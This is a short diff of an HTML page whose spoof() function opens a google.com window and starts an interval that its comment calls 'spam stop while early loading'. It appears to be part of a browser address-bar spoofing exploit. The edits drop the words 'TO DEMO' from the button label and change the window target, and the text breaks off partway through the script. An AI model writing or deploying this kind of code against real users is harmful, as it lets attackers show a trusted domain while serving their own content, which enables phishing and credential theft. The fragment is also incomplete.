@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="spoof()">CLICK TO DEMO</button>
+<button onclick="spoof()">CLICK </button>
 
 <script>
 function spoof() {
 
     // 1) open target domain
-    let win = window.open("https://www.google.com:8080", "_blank");
+    let win = window.open("https://www.google.com:8080", "https://www.google.com:8080");
 
     // 2) spam stop while early loading
     let killer = setInterval(()=>{
